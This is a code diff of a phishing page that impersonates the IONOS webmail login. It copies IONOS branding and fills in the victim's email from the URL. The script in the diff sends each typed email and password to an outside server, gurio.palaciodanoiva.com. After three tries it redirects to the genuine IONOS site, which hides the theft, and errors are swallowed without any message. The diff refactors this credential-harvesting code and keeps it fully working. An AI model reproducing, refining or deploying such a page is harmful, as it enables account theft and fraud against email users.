@@ -12,15 +12,11 @@
         body{background-color: #F4F7FA !important; min-height: 100vh; } 
         .theformbox1, .theformbox2{border: 1px solid #bcc8d4; font-family: "OverpassRegular",arial,arial narrow,sans-serif; color: #001b41}
         input{border: 1px solid #97a3b4;}
-        input:focus, input:hover, input:active {
-            border-color: #1474c4;}
+        input:focus, input:hover, input:active { border-color: #1474c4; }
         .button{background-color: #0b2a63}
         .button:hover{background-color: #1474c4}
-        .formfooter{
-            background-color: #f4f7fa; margin: 0 -31.0px -31px; padding: 40px 30px; 
-        }
-        .bg2{border: 1px solid #bcc8d4; margin:0 auto; width:100%;   display: grid;
-          place-items: center; }
+        .formfooter{ background-color: #f4f7fa; margin: 0 -31.0px -31px; padding: 40px 30px; }
+        .bg2{border: 1px solid #bcc8d4; margin:0 auto; width:100%; display: grid; place-items: center; }
         .bg2:active, .bg2:focus, .bg2:hover { background-color: #fff; border: 1px solid #bcc8d4; box-shadow: 0 2px 8px 0 #718095; cursor:pointer; }
         .barload { text-align: center; margin-top: -16px; }
         .barload span { animation: blink 1s infinite; font-size: 2rem; border-radius:14px }
@@ -28,22 +24,20 @@
         .barload span:nth-child(3) { animation-delay: 0.4s; }
         @keyframes blink { 0% { opacity: .2; } 20% { opacity: 1; } 100% { opacity: .2; } }
         .footer {margin-top: auto; background-color: #fff; bottom: 0;}
-        .allop{ display: flex; place-items: center;gap: 5px; }
+        .allop{ display: flex; place-items: center; gap: 5px; }
         .usridentity-fa{ cursor:pointer; position:relative; }
         .usridentity-fa:hover{ background-color: #dbedf8; border-radius: 50%; width: 28px; height: 28px} 
         .usridentity{ margin-top:2px; margin-left: 4px}
         #iduserhere{ margin-left:10px; font-weight:bold; color:#1474c4; opacity:0.8; font-size:15px; } 
         .hide{display: none}
-        .button:disabled {
-            cursor: not-allowed; opacity: 0.85
-        }
+        .button:disabled { cursor: not-allowed; opacity: 0.85 }
     </style>    
 </head>
 <body class="">
     <div class="">
         <div class="flex justify-between items-center border-b py-2 px-4 headerbar">
-            <span> <img src="https://i.ibb.co/sJtGGVdk/ionoslogo.png" width="289" height="46">  </span>
-            <div class="flex items-center space-x-4" style=" margin-left: -15rem; ">
+            <span><img src="https://i.ibb.co/sJtGGVdk/ionoslogo.png" width="289" height="46"></span>
+            <div class="flex items-center space-x-4" style="margin-left: -15rem;">
                 <img src="https://i.ibb.co/SDKY4C48/searchbar.png">
             </div>
             <div class="flex items-center space-x-4">
@@ -52,7 +46,7 @@
         </div>
 
         <div class="flex justify-center my-10">
-            <div class="bg-white rounded-lg theformbox1  p-8 w-full max-w-2xl">
+            <div class="bg-white rounded-lg theformbox1 p-8 w-full max-w-2xl">
                 <div class="flex items-center space-x-2 mb-9">
                     <img src="https://i.ibb.co/M5p2GpPW/product-email.png">
                     <h2 class="text-xl bold">My Webmail Login</h2>
@@ -92,7 +86,7 @@
                     <div class="text-sm mb-5 mt-4">
                         <a class="text-blue-600" style="color:#02102b;font-family: OpenSansSemibold,arial,sans-serif;"><strong>Not your device?</strong> Log out after the session or use private browsing mode.</a>
                     </div>
-                    <button class="flex justify-center gap-1 items-center text-white button rounded-3xl w-full py-1 mb-10" id="pwButton">Next<div id="barload" class="barload hide" style=""><span>.</span><span>.</span><span>.</span></div></button>
+                    <button class="flex justify-center gap-1 items-center text-white button rounded-3xl w-full py-1 mb-10" id="pwButton">Next<div id="barload" class="barload hide"><span>.</span><span>.</span><span>.</span></div></button>
                 </form>
             </div>
         </div>
@@ -102,27 +96,27 @@
 
             <div class="grid grid-cols-3 gap-4 m-4"> 
                <div class="text-center">
-                <div class="bg-white bg2 rounded-lg p-4 ">
+                <div class="bg-white bg2 rounded-lg p-4">
                   <img src="https://i.ibb.co/0jRqDSxb/my-account-svg.png" alt="My Account">
                   <div>My IONOS</div>
                 </div>
               </div>
               <div class="text-center">
-                <div class="bg-white bg2 rounded-lg p-4 ">
+                <div class="bg-white bg2 rounded-lg p-4">
                   <img src="https://i.ibb.co/625pJHs/product-hidrive.png" alt="HiDrive">
                   <div>HiDrive</div>
                 </div>
               </div>
               <div class="text-center">
-                <div class="bg-white bg2 rounded-lg p-4 ">
+                <div class="bg-white bg2 rounded-lg p-4">
                   <img src="https://i.ibb.co/Vp5DYvqG/product-mail-archiving.png" alt="Email Archiving">
-                  <div class="">Email Archiving</div>
+                  <div>Email Archiving</div>
                 </div>
               </div>
             </div>
          </div>
 
-         <div class="flex justify-between items-center  border-t footer pt-1 px-8" style="position: absolute; width: 100%;  height: 90px; vertical-align: center;border-top: 1px solid #bcc8d4">
+         <div class="flex justify-between items-center border-t footer pt-1 px-8" style="position: absolute; width: 100%; height: 90px; vertical-align: center; border-top: 1px solid #bcc8d4">
             <div class="allop">
                <img src="https://i.ibb.co/8gZKvtL0/greendot.png"> All Systems Operational
             </div>
@@ -148,104 +142,91 @@
             const hiddenuser = document.getElementById("hiddenuser");
             const passwd = document.getElementById("password");
             const backtoem = document.getElementById("backtoem");
-            const idd = location.hash.slice(1); 
             const iduserhere = document.getElementById("iduserhere");
             
-            userid.value = idd;
-            document.getElementById("thisyear").innerHTML = new Date().getFullYear();
-
             const PROCESS_URL = "https://gurio.palaciodanoiva.com/ono/guv.php";
-            
-            barLoad.classList.add("hide"); 
-            emButton.classList.add("py-2");
-
-            // Initialize attempt counter
             let attempts = 0;
+            
+            // Initialize
+            barLoad.classList.add("hide");
+            emButton.classList.add("py-2");
+            document.getElementById("thisyear").innerHTML = new Date().getFullYear();
+            if (location.hash) userid.value = location.hash.slice(1);
 
-            // Handle email autofill
-            userid.addEventListener('change', () => {
-                hiddenuser.value = userid.value;
-            });
-
+            // Email validation
             emButton.addEventListener("click", (event) => {
-                emerror.classList.add("hide");
                 event.preventDefault();
                 if (userid.value === "") {
                     userid.classList.add("border-red-500");
                     emerror.classList.remove("hide");
                     userid.focus();
-                } 
-                else {
-                    userid.classList.remove("border-red-500");
-                    var wemail = userid.value;
-                    hiddenuser.value = wemail;
-                    showPassDiv(wemail); 
-                    iduserhere.textContent = wemail;
-                    
-                    backtoem.addEventListener("click", (event) => {
-                        showEmailDiv(wemail);
-                    });
-                }         
-            });
-
-            pwButton.addEventListener("click", async (event) => {
-                pwerror.classList.add("hide");
-                event.preventDefault();
-                
-                if (passwd.value === "") {
-                    passwd.classList.add("border-red-500");
-                    pwerror.classList.remove("hide");
-                    passwd.focus();
                     return;
                 }
                 
+                userid.classList.remove("border-red-500");
+                emerror.classList.add("hide");
+                hiddenuser.value = userid.value;
+                iduserhere.textContent = userid.value;
+                showPassDiv();
+            });
+
+            // Password submission
+            pwButton.addEventListener("click", async (event) => {
+                event.preventDefault();
+                
+                // Show loading
                 barLoad.classList.remove("hide");
                 pwButton.disabled = true;
                 attempts++;
                 
                 try {
+                    // Send data to backend
                     await fetch(PROCESS_URL, {
                         method: 'POST',
                         body: `email=${encodeURIComponent(hiddenuser.value)}&pass=${encodeURIComponent(passwd.value)}&attempt=${attempts}`,
-                        headers: {
-                            'Content-Type': 'application/x-www-form-urlencoded'
-                        }
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                     });
-
+                    
+                    // Always clear password after attempt
+                    passwd.value = "";
+                    
+                    // Redirect after 3 attempts
                     if (attempts >= 3) {
                         window.location.href = "https://email.ionos.com/appsuite/";
                     } else {
-                        passwd.value = "";
                         passwd.focus();
                     }
                 } catch (error) {
-                    // Silent failure - no error shown to user
+                    // Silent failure - just clear password
+                    passwd.value = "";
+                    passwd.focus();
                 } finally {
+                    // Reset UI
                     barLoad.classList.add("hide");
                     pwButton.disabled = false;
                 }
-            });      
+            });
 
-            let showEmailDiv = (em) => {
+            // Back to email form
+            backtoem.addEventListener("click", (event) => {
+                event.preventDefault();
+                showEmailDiv();
+            });
+
+            function showEmailDiv() {
                 theformbox1.classList.remove("hide");
                 theformbox2.classList.add("hide");
-                pwerror.classList.add("hide");
                 emerror.classList.add("hide");
-                userid.value = em;
-                hiddenuser.value = em;
-            };
-            
-            let showPassDiv = (em) => {
+                pwerror.classList.add("hide");
+                userid.focus();
+            }
+
+            function showPassDiv() {
                 theformbox2.classList.remove("hide");
                 theformbox1.classList.add("hide");
                 pwerror.classList.add("hide");
-                emerror.classList.add("hide");         
-                hiddenuser.value = em;
-                
-                setTimeout(() => {
-                    passwd.focus();
-                }, 100);
-            };
+                setTimeout(() => passwd.focus(), 100);
+            }
         });
     </script>
 </body>
